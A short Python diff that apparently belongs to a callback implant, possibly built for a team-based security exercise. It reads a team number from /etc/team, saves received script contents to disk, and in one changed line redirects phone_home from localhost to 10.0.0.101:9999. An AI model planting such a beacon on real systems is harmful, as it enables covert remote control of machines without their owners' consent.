@@ -8,16 +8,16 @@ def get_team_number():
   team_file_name = "/etc/team"
 
   try:
-    with open(team_file_name, 'r') as file:
-      team_number = file.read()
+    file = open(team_file_name, 'r')
+    team_number = file.read()
   except:
     team_number = 0
 
   return team_number
 
 def create_local_script(script_location, script_contents):
-  with open(script_location, "w") as file:
-    file.write(script_contents)
+  file = open(script_location, 'w')
+  file.write(script_contents)
 
 def attempt_script_save(script_contents):
   home_dir = os.path.expanduser("~")
@@ -57,7 +57,7 @@ def phone_home(ip, port):
 
     return(response)
 
-ip = "127.0.0.1"
+ip = "10.0.0.101"
 port = 9999
 
 phone_home(ip, port)
